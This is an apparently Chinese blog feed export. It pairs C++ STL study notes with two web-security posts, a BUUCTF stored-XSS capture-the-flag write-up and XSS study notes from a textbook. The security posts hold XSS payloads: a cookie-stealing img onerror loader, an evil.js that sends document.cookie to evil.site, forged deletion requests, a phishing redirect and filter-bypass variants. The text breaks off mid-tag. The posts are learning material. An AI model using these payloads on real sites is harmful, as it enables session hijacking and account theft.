title="erase"></a>erase</h3><p>erase函数会将目标真正地移除。</p><p>注意一个语法细节：<code>erase(iter,iter)</code>如果前后两个迭代器指向位置相同，则不做任何删改；若想要删除某一位元素，只需填写单独一个参数即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; demo&#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>&#125;;<br>    <span class="hljs-keyword">auto</span> iter = std::<span class="hljs-built_in">remove</span>(demo.<span class="hljs-built_in">begin</span>(), demo.<span class="hljs-built_in">end</span>(), <span class="hljs-number">3</span>);<br>    demo.<span class="hljs-built_in">erase</span>(iter, std::<span class="hljs-built_in">end</span>(demo));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> first = demo.<span class="hljs-built_in">begin</span>(); first &lt; demo.<span class="hljs-built_in">end</span>(); ++first)<br>    &#123;<br>        cout &lt;&lt; *first &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    <span class="hljs-comment">// 输出剩余的元素</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;size is :&quot;</span> &lt;&lt; demo.<span class="hljs-built_in">size</span>() &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;capacity is :&quot;</span> &lt;&lt; demo.<span class="hljs-built_in">capacity</span>() &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 1 4 5 </span><br><span class="hljs-comment">// size is :3</span><br><span class="hljs-comment">// capacity is :6    </span><br><br></code></pre></td></tr></table></figure><h2 id="map数据结构"><a href="#map数据结构" class="headerlink" title="map数据结构"></a>map数据结构</h2><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><ul><li><p>map 底层原理是通过红黑树实现，map内部的数据都是有序的。其查询，插入，删除操作的事件复杂度都是logn。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string&gt;</span></span><br> <br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// 构造函数</span><br>map&lt;string, <span class="hljs-type">int</span>&gt; dict;<br><br><span class="hljs-comment">// 插入数据的三种方式</span><br>dict.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">pair</span>&lt;string,<span class="hljs-type">int</span>&gt;(<span class="hljs-string">&quot;apple&quot;</span>,<span class="hljs-number">2</span>));<br>dict.<span class="hljs-built_in">insert</span>(map&lt;string, <span class="hljs-type">int</span>&gt;::<span class="hljs-built_in">value_type</span>(<span class="hljs-string">&quot;orange&quot;</span>,<span class="hljs-number">3</span>));<br>dict[<span class="hljs-string">&quot;banana&quot;</span>] = <span class="hljs-number">6</span>;<br> <br><span class="hljs-comment">// 判断是否有元素</span><br><span class="hljs-keyword">if</span>(dict.<span class="hljs-built_in">empty</span>())<br>cout&lt;&lt;<span class="hljs-string">&quot;该字典无元素&quot;</span>&lt;&lt;endl;<br><span class="hljs-keyword">else</span><br>cout&lt;&lt;<span class="hljs-string">&quot;该字典共有&quot;</span>&lt;&lt;dict.<span class="hljs-built_in">size</span>()&lt;&lt;<span class="hljs-string">&quot;个元素&quot;</span>&lt;&lt;endl;<br> <br><span class="hljs-comment">// 遍历</span><br>map&lt;string, <span class="hljs-type">int</span>&gt;::iterator iter;<br><span class="hljs-keyword">for</span>(iter=dict.<span class="hljs-built_in">begin</span>();iter!=dict.<span class="hljs-built_in">end</span>();iter++)<br>cout&lt;&lt;iter-&gt;first&lt;&lt;ends&lt;&lt;iter-&gt;second&lt;&lt;endl;<br> <br><span class="hljs-comment">// 查找</span><br><span class="hljs-keyword">if</span>((iter=dict.<span class="hljs-built_in">find</span>(<span class="hljs-string">&quot;banana&quot;</span>))!=dict.<span class="hljs-built_in">end</span>()) <span class="hljs-comment">//  返回一个迭代器指向键值为key的元素，如果没找到就返回end()</span><br>cout&lt;&lt;<span class="hljs-string">&quot;已找到banana,其value为&quot;</span>&lt;&lt;iter-&gt;second&lt;&lt;<span class="hljs-string">&quot;.&quot;</span>&lt;&lt;endl;<br><span class="hljs-keyword">else</span><br>cout&lt;&lt;<span class="hljs-string">&quot;未找到banana.&quot;</span>&lt;&lt;endl;<br> <br><span class="hljs-keyword">if</span>(dict.<span class="hljs-built_in">count</span>(<span class="hljs-string">&quot;watermelon&quot;</span>)==<span class="hljs-number">0</span>) <span class="hljs-comment">// 返回键值等于key的元素的个数</span><br>cout&lt;&lt;<span class="hljs-string">&quot;watermelon不存在&quot;</span>&lt;&lt;endl;<br><span class="hljs-keyword">else</span><br>cout&lt;&lt;<span class="hljs-string">&quot;watermelon存在&quot;</span>&lt;&lt;endl;<br><br>pair&lt;map&lt;string, <span class="hljs-type">int</span>&gt;::iterator, map&lt;string, <span class="hljs-type">int</span>&gt;::iterator&gt; ret;<br>ret = dict.<span class="hljs-built_in">equal_range</span>(<span class="hljs-string">&quot;banana&quot;</span>); <span class="hljs-comment">// 查找键值等于 key 的元素区间为[start,end)，指示范围的两个迭代器以 pair 返回</span><br>cout&lt;&lt;ret.first-&gt;first&lt;&lt;ends&lt;&lt;ret.first-&gt;second&lt;&lt;endl;<br>cout&lt;&lt;ret.second-&gt;first&lt;&lt;ends&lt;&lt;ret.second-&gt;second&lt;&lt;endl;<br> <br>iter = dict.<span class="hljs-built_in">lower_bound</span>(<span class="hljs-string">&quot;boluo&quot;</span>); <span class="hljs-comment">// 返回一个迭代器，指向键值&gt;=key的第一个元素。</span><br>cout&lt;&lt;iter-&gt;first&lt;&lt;endl;<br>iter = dict.<span class="hljs-built_in">upper_bound</span>(<span class="hljs-string">&quot;boluo&quot;</span>); <span class="hljs-comment">// 返回一个迭代器，指向值键值&gt;key的第一个元素。</span><br>cout&lt;&lt;iter-&gt;first&lt;&lt;endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h3><p>该类型不会根据key排序，存储时根据key的hash值判断元素是否相同。</p><h2 id="获取随机数"><a href="#获取随机数" class="headerlink" title="获取随机数"></a>获取随机数</h2><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">srand</span>((<span class="hljs-variable">unsigned</span>)<span class="hljs-title"><span class="hljs-built_in">time</span></span>(<span class="hljs-variable"><span class="hljs-literal">NULL</span></span>));<span class="hljs-comment">//seed</span></span><br><span class="hljs-function"><span class="hljs-variable">random_num</span> = <span class="hljs-title">rand</span>();</span><br></code></pre></td></tr></table></figure><h2 id="除自身外数组乘积"><a href="#除自身外数组乘积" class="headerlink" title="除自身外数组乘积"></a>除自身外数组乘积</h2><p>此题需计算数组中，除目标数以外，所有对象的乘积，且时间复杂度在O(n)内，例如：</p><ul><li>nums = [1,2,3,4];</li><li>output = [24,12,8,6];</li></ul><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ul><li>关键点在于，时间有要求，不能双重循环，计算乘积时，需要只计算一遍；</li><li>将每个数的前缀积与后缀积计算出来，再经过一次循环即可解决；</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;nums.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>;i++)<br>        &#123;<br>            a*=nums[i];<span class="hljs-comment">//乘积，从第一项开始乘，并进行存储</span><br>            prefix.<span class="hljs-built_in">push_back</span>(a);<br>        &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS实验</title>
    <link href="/2024/03/02/XSS%E5%AE%9E%E9%AA%8C/"/>
    <url>/2024/03/02/XSS%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS-实验合集"><a href="#XSS-实验合集" class="headerlink" title="XSS 实验合集"></a>XSS 实验合集</h1><p>  写在前面：笔者拜读完《白帽子讲Web安全》的第六章——XSS跨站脚本攻击后，仅知其理论，从书上读些文字、图片，如同隔靴搔痒，本人深知实践的重要性，便开始进行一些关于 XSS 的实践。</p><h2 id="存储型-XSS-——我的第一次XSS-from-BUUCTF"><a href="#存储型-XSS-——我的第一次XSS-from-BUUCTF" class="headerlink" title="存储型 XSS ——我的第一次XSS (from BUUCTF)"></a>存储型 XSS ——我的第一次XSS (from BUUCTF)</h2><p>  笔者在 BUUCTF 平台上找了一道 XSS 的题目，借此浅探 XSS 的利用方法。</p><p>  题目地址：<a href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%89%E7%AB%A0][3.3.4%20%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90]BUU%20XSS%20COURSE%201">https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%89%E7%AB%A0][3.3.4%20%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90]BUU%20XSS%20COURSE%201</a></p><p>  启动靶机后，打开网页，发现一个大大的输入框，其实根据我找题目的目的性，知道这里肯定有一个简单的 XSS 漏洞让我入门。</p><p>  <img src="/2024/03/02/XSS%E5%AE%9E%E9%AA%8C/1.png"></p><p>  尝试输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，好像并没有什么反应，再尝试一下 img 类型 <code>&lt;img src=&quot;ss&quot;&gt;</code>，进入提示框里面的地址以后发现，”树洞内容“后有一张损坏的图片。这说明有漏洞了。根据”登录“按钮推测，我们可以通过存储型 XSS 获取管理员的 Cookie 和 后台地址。</p><p>  打开 XSS 平台，将其 img 格式的 payload 复制一个喂给该网站</p>   <figure class="highlight xml"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> ο<span class="hljs-attr">nerr</span>ο<span class="hljs-attr">r</span>=<span class="hljs-string">s</span>=<span class="hljs-string">createElement(</span>&#x27;<span class="hljs-attr">script</span>&#x27;);<span class="hljs-attr">body.appendChild</span>(<span class="hljs-attr">s</span>);<span class="hljs-attr">s.src</span>=<span class="hljs-string">&#x27;example.com&#x27;</span>;&gt;</span><br><br></code></pre></td></tr></table></figure><p>  它使用 &gt; 标签的 onerror 事件来执行一个 JavaScript 代码块。当图片加载失败时，onerror 事件将被触发，从而执行该代码块。该代码块创建了一个script元素，并将其 src 属性设置为 example.com。然后，它将该元素添加到文档的头部。这意味着，当页面加载时，该脚本将被下载并执行，从而允许攻击者注入恶意代码并执行任意操作。</p><p>  接着访问一下，弹框给出的网站后（直接将弹框内的地址拼接在当前网站URL之后），回到 XSS 平台，发现已经获取到了管理员的敏感信息~</p><p><img src="/2024/03/02/XSS%E5%AE%9E%E9%AA%8C/2.png"></p><p>  其中的<code>backend/admin.php</code>与<code>cookie</code>正是我们需要的东西。</p><p>  访问<code>http://bc04c93b-ca0a-4612-b817-d04fa8840781.node5.buuoj.cn:81/backend/admin.php</code>后，利用浏览器插件<code>EditThisCookie</code>设置cookie为管理员cookie，即可获取 flag，达到了存储型 XSS 获取敏感信息的利用。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web安全学习</title>
    <link href="/2024/02/28/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/02/28/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Web安全学习"><a href="#Web安全学习" class="headerlink" title="Web安全学习"></a>Web安全学习</h1><p>  笔者正在学习渗透测试的途中，此篇博客用于记录学习历程、学习内容。</p><h2 id="书单"><a href="#书单" class="headerlink" title="书单"></a>书单</h2><p>  该仓库内有许多安全方面的书籍：</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/fengjixuchui/</span>Information_Security_Books<br></code></pre></td></tr></table></figure><p>  笔者本人购买了实体书籍《白帽子讲 Web 安全》（第二版），同时正在参阅书单中《渗透测试实战第三版（红队版）》，近期内容将围绕上述两本书展开。</p><h2 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h2><p>  <strong>凡是可以往目标站点注入脚本的攻击行为都可以称为跨站脚本攻击（XSS）</strong></p><h3 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h3><p>  对于如下源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>session_start();<br>$name = isset($_GET[&#x27;name&#x27;]) ? $_GET[&#x27;name&#x27;] : &#x27;&#x27;;<br>?&gt;<br>&lt;p&gt; Hello, &lt;?php echo $name; ?&gt;!&lt;/p&gt;<br></code></pre></td></tr></table></figure><p>  由于直接将接收到的客户端提交的参数输出到HTML页面，若name参数包含HTML标签，则会当作代码来执行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">name = <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>  如此，便会暴露其 cookie，以提示框形式显示在页面上。</p><h3 id="XSS的攻击类型"><a href="#XSS的攻击类型" class="headerlink" title="XSS的攻击类型"></a>XSS的攻击类型</h3><h4 id="反射型-XSS-攻击"><a href="#反射型-XSS-攻击" class="headerlink" title="反射型 XSS 攻击"></a>反射型 XSS 攻击</h4><p>  <strong>反射型 XSS 攻击是指服务端应用在收到客户端的请求后，未经过参数检查或安全过滤，直接将参数用于 HTML 中用于页面构建。</strong></p><p>  最常见的反射型 XSS 攻击方式是将恶意代码包含在 URL 参数中，但是攻击者需要诱使用户点击这个恶意 URL ，攻击才能成功。</p><p>  反射型 XSS 也被称为“<strong>非持久型 XSS</strong>”，因为其 Payload 并<strong>未持久存储于服务端应用</strong>中，<strong>每次</strong>实施攻击都需要受害者访问带 Payload 的 URL。</p><p><img src="/2024/02/28/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/p1.jpg"></p><h4 id="存储型-XSS-攻击"><a href="#存储型-XSS-攻击" class="headerlink" title="存储型 XSS 攻击"></a>存储型 XSS 攻击</h4><p>  在存储型 XSS 攻击中，服务端应用<strong>将攻击者提交的恶意代码存储在服务端</strong>，受害者每次访问一个“干净”的 URL 时，服务端会在相应页面中嵌入之前存储的恶意代码，这些恶意代码将在受害者客户端执行。由于<strong>不需要在受害者的请求中夹带恶意代码</strong>，故<strong>此种攻击更稳定，危害性也更大</strong>。</p><p>  例如：一个博客系统中存在该类漏洞，攻击者可以写一篇包含恶意 JavaScript 代码的博客文章，当其余用户浏览攻击者发布的博客时，该恶意代码就会执行。</p><p>  存储型 XSS 漏洞也可能出现在一些更隐蔽、影响面更大的场景中，如社交网站中的个人简介、签名，甚至是昵称。如果网站没有相应的安全策略，就有可能产生这样的漏洞。</p><p><img src="/2024/02/28/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/p2.jpg"></p><h4 id="基于-DOM-的-XSS-攻击"><a href="#基于-DOM-的-XSS-攻击" class="headerlink" title="基于 DOM 的 XSS 攻击"></a>基于 DOM 的 XSS 攻击</h4><p>  前两种攻击方法都是与服务端应用的处理逻辑有关系的，恶意 JavaScript 代码在 HTTP 请求中被视为服务端的输入，并且被嵌入返回的 HTML 页面。但是正常应用中的 JavaScript 程序也可以接受外部的输入数据，并直接在客户端渲染和执行，如果处理不当，它就可能将外部数据当代码来执行。</p><p>  即利用当前页面本身的 JavaScript 代码缺陷，进行恶意代码执行，而不是服务端返回恶意代码给到客户端执行，所以这种攻击称为基于 DOM 的 XSS 攻击。</p><p>  例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span> = <span class="hljs-string">&quot;URL&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">     <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;URL&#x27;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-built_in">decodeURI</span>(location.<span class="hljs-property">herf</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>  JavaScript 代码将当前页面的 URL 当作 HTML 代码插入网页，此时如果 URL 中含有 HTML 标签，就将在当前网页产生新的 DOM 节点，通过特定标签可以引入 JavaScript 代码并执行。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">8000</span>/domxss.html?&lt;img src=<span class="hljs-number">0</span> onerror=<span class="hljs-string">&quot;alert(&#x27;xss&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p>  访问此 URL 后，浏览器将执行 URL 中指定的 JavaScript 弹窗代码。此案例看起来很像反射型 XSS ，但是它和反射型 XSS 有着本质的区别，因为服务端返回的 HTML 源码中并没有相应的弹窗代码，弹框代码是客户端原有页面的 JavaScript 代码在执行过程中引入的。它本质上是前端 JavaScript 的漏洞，而不是服务端程序的漏洞。</p><p><img src="/2024/02/28/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/p3.jpg"></p><h4 id="Self-XSS-攻击"><a href="#Self-XSS-攻击" class="headerlink" title="Self-XSS 攻击"></a>Self-XSS 攻击</h4><p>  这个类型的 XSS 攻击与前面几种手法不太一样，Self-XSS 是利用社会工程学欺骗用户，让他们复制恶意代码并粘贴到浏览器中，所以称为“Self-XSS”攻击。</p><p>  但是现在大部分浏览器都有一定的防御措施，如地址栏不支持或不允许粘贴 JavaScript 伪协议的 URL，这种攻击也就失效了。</p><h3 id="XSS-攻击进阶"><a href="#XSS-攻击进阶" class="headerlink" title="XSS 攻击进阶"></a>XSS 攻击进阶</h3><p>  最常见的 XSS Payload 是通过读取浏览器的 Cookie 对象而发起“Cookie 劫持”攻击的。由于 Web 应用通常用 Cookie 作为用户的身份凭证，如果一个用户的 Cookie 被攻击者获取，意味着攻击者获得了该用户的身份。</p><p>  通常，为了实现复杂的攻击逻辑，可以将 Payload 放在一个 JavaScript 文件中， 然后通过&lt;script&gt;标签载入，这样就可以避免在 URL 中写入大量的代码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8000</span><span class="hljs-regexp">/echo.php?name=&lt;script src=&quot;http:/</span><span class="hljs-regexp">/evil.site/</span>evil.js<span class="hljs-string">&quot;&gt;&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p>  在 evil.js 中，可以通过如下代码读取 Cookie 并将其发送到远程服务器上：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>();<br>img.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;http://evil.site/log?cookie=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);<br></code></pre></td></tr></table></figure><p>  这段代码将 Cookie 作为参数填到一个攻击者指定的 URL 中，然后将 URL 作为一个图像的 src 属性，浏览器向攻击者指定网站（evil.site）发送尝试获取图像请求，实则是将受害者的 Cookie 发送到其指定网站。</p><p>  攻击者获得 Cookie 之后，则可将其填入自己的浏览器，以受害者身份访问应用。</p><h4 id="构造-GET-和-POST-请求"><a href="#构造-GET-和-POST-请求" class="headerlink" title="构造 GET 和 POST 请求"></a>构造 GET 和 POST 请求</h4><p>  Web 应用通常是通过发送 GET 和 POST 请求与服务端交互的， XSS 攻击能实现在受害者浏览器中执行任意 JavaScript 代码，所以攻击者可以通过 JavaScript 让受害者发送 GET 或 POST 请求来执行 Web 应用中的功能。如博客的发表、删除和点赞等等。</p><p>  关于构造 GET 请求，最简单的办法就是创建 Image 对象， 将其 src 属性指定为目标 URL，这样浏览器在获取图像时，就在当前页面发送了 GET 请求。</p><p>  如：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> <span class="hljs-type">Image</span>();<br>img.src = <span class="hljs-string">&#x27;http://blog.example.com/del?id=123&#x27;</span><br></code></pre></td></tr></table></figure><p>  在更多场景里，执行特定功能的操作是通过 POST 请求来实现的。使用 JavaScript 发送 POST 请求也很简单，有两种方法可以做到。</p><p>  对于提交表单的操作，可以使用 JavaScript 创建一个表单对象，填充表单中的字段，然后提交。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">var</span> <span class="hljs-keyword">form</span> = document.createElement(&#x27;<span class="hljs-keyword">form</span>&#x27;);<br><span class="hljs-keyword">form</span>.method = &#x27;<span class="hljs-keyword">POST</span>&#x27;;<br><span class="hljs-keyword">form</span>.action = &#x27;http:<span class="hljs-comment">//blog.example.com/del&#x27;;</span><br><span class="hljs-keyword">var</span> il = document.createElement(<span class="hljs-string">&quot;input&quot;</span>);<br>il.name = &#x27;id&#x27;;<br>il.value = &#x27;123&#x27;;<br><span class="hljs-keyword">form</span>.appendChild(il);<br><span class="hljs-keyword">form</span>.submit();<br></code></pre></td></tr></table></figure><p>  这种方式只能提交表单形式的请求。</p><p>  对于更复杂的数据格式请求，需要用到 XMLHttpRequest 或 Fetch API，假如删除博客操作需要提交一个 JavaScriptON 格式的数据到服务端，代码如下：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-type">XMLHttpRequest</span>();<br><span class="hljs-keyword">var</span> json = &#123;<br>    <span class="hljs-string">&quot;id&quot;</span> = <span class="hljs-string">&quot;123&quot;</span><br>&#125;;<br>xhr.open(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;/del&#x27;</span>);<br>xhr.setRequestHeader(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;application/json&#x27;</span>);<br>xhr.send(JavaScriptON.stringify(json));<br></code></pre></td></tr></table></figure><h4 id="XSS-钓鱼"><a href="#XSS-钓鱼" class="headerlink" title="XSS 钓鱼"></a>XSS 钓鱼</h4><p>  很多论坛或即时聊天软件都有识别可信 URL 的功能，但如果白名单上的 URL 存在 XSS 漏洞，则攻击者可非常简单地通过 XSS 实现 URL 跳转：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">http://example.com/echo<span class="hljs-built_in">.name</span>.php<span class="hljs-built_in">?name</span>=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&#x27;http://evil.site/&#x27;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>  如果受害者以为自己还在 example 这个域名内，很可能会输入账号密码等敏感数据。</p><h4 id="XSS-攻击平台"><a href="#XSS-攻击平台" class="headerlink" title="XSS 攻击平台"></a>XSS 攻击平台</h4><p>如 BeEF（<a href="https://beefproject.com/%EF%BC%89">https://beefproject.com/）</a></p><h3 id="XSS-蠕虫"><a href="#XSS-蠕虫" class="headerlink" title="XSS 蠕虫"></a>XSS 蠕虫</h3><p>  XSS 蠕虫最早是由 Samy Kamkar 实现并传播，其在短短几小时内感染了百万名用户，它在每位用户的简介后加上了一句话：”but most of all, Samy is my hero.”，这是 Web 安全史上的第一个重量级 XSS 蠕虫，具有里程碑意义。</p><p>  XSS 蠕虫一般利用存储型 XSS 漏洞，将攻击代码存放在个人签名、站内信上，被感染后执行好友间群发，以具有诱惑力的标题将受害者引入（例如：有人暗恋你哦，你想知道ta是谁吗），成为新的载体。</p><h3 id="XSS-攻击技巧"><a href="#XSS-攻击技巧" class="headerlink" title="XSS 攻击技巧"></a>XSS 攻击技巧</h3><h4 id="基本变形"><a href="#基本变形" class="headerlink" title="基本变形"></a>基本变形</h4><p>  最简单的方式是改变字母的大小写。HTML 标签是大小写不敏感的。</p><p>  如果安全过滤函数只是简单检测 &lt;script&gt; 特征，则可以使用空格、换行符等绕过检测，如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span></span><br><span class="hljs-tag">    &gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">domain</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>  有些安全检测函数会删掉 script 标签，则提交如下 payload，在其过滤一次后，仍有有效标签：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 